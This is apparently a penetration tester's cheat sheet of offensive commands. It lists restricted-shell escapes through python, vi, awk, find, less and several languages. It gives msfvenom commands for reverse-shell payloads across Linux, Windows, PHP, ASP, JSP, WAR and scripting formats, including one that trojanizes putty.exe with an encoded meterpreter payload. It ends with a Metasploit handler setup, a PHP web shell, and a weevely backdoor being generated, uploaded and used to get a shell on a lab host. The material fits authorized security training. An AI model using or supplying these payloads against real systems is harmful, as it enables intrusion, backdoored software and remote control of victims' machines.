== SPAWN a shell ==
   
   python -c 'import pty; pty.spawn("/bin/bash")'
   
   - open vi or vim and type:
   :set shell=/bin/bash
   
   Next, type and execute
   :shell
   
   or
   :! /bin/bash
   
  == AWK ==
  awk 'BEGIN {system("/bin/sh")}'
  
  == FIND ==:
  find / -name blahblah 'exec /bin/awk 'BEGIN {system("/bin/sh")}' \;
  
  == MORE, less, and man Commands ==
  - After you use the 'more', 'less', or 'man' command with a file, type '!' followed by a command. For instance, try the following once inside the file:
   
 '! /bin/sh'
'!/bin/sh'
'!bash'

== tee command == 
echo "evil script code" | tee script.sh
// tee -a to append at the end of the file

== Spawn a shell with a programming language ==
Try invoking a SHELL through your favorite language:

python: exit_code = os.system('/bin/sh') output = os.popen('/bin/sh').read()
perl -e 'exec "/bin/sh";'
perl: exec "/bin/sh";
ruby: exec "/bin/sh"
lua: os.execute('/bin/sh')
irb(main:001:0> exec "/bin/sh" 
 
 
            == MSFVENOM ==
    
 List payloads
 msfvenom -l
 
            == Binaries ==
 Linux
 msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f elf > shell.elf
    
 Windows
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f exe > shell.exe
 
 msfvenom -a x86 --platform windows -x putty.exe -k -p windows/meterpreter/reverse_tcp lhost=10.11.0.159 -e x86/shikata_ga_nai -i 5 -b "\x00" -f exe -o putty1.exe

 
           == Web payloads ==
  
  PHP
msfvenom -p php/meterpreter_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.php
cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php

ASP
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f asp > shell.asp

JSP
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.jsp
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.11.0.159 LPORT=53 R > cmd.jsp

WAR
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f war > shell.war

            == Scripting Payloads ==

Python
msfvenom -p cmd/unix/reverse_python LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.py

BASH
msfvenom -p cmd/unix/reverse_bash LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.sh

Perl
msfvenom -p cmd/unix/reverse_perl LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.pl



          == HANDLERS ==
    
use exploit/multi/handler
set PAYLOAD <Payload name>
set LHOST <LHOST value>
set LPORT <LPORT value>
set ExitOnSession false
exploit -j -z

mssf > use exploit/multi/handler 
msf exploit(handler) > setg PAYLOAD java/jsp_shell_reverse_tcp
PAYLOAD => java/jsp_shell_reverse_tcp
set LHOST 10.11.0.159
set LPORT 4343
LPORT => 4343
msetg SHELL cmd.exe
exploit -j -z

  
    == PHP shell. Execute some PHP code on a HTML/PHP page ==

<?php
$output = shell_exec('ls ../../');
echo "<pre>$output</pre>";
?>

http://pentestmonkey.net/tools/web-shells/php-reverse-shell

#Weevly3 , PHP shell
https://github.com/epinna/weevely3/wiki/Install-and-first-run

root@k22:~/Downloads/post-exploitation/weevely3# ./weevely.py generate some_password /root/Desktop/backdoor.php
Generated backdoor with password 'some_password' in '/root/Desktop/backdoor.php' of 1332 byte size.
#upload the shell (somewhere accessible)
#access the URL where the backdoor is located(http://192.168.230.150:8081/images/shells/backdoor.php)
#then execute

root@k22:~/Downloads/post-exploitation/weevely3# ./weevely.py http://192.168.230.150:8081/images/shells/backdoor.php some_password

[+] weevely 3.2.0

[+] Target:     192.168.230.150:8081
[+] Session:    /root/.weevely/sessions/192.168.230.150/backdoor_0.session

[+] Browse the filesystem or execute commands starts the connection
[+] to the target. Type :help for more information.

weevely> whoami
www-data
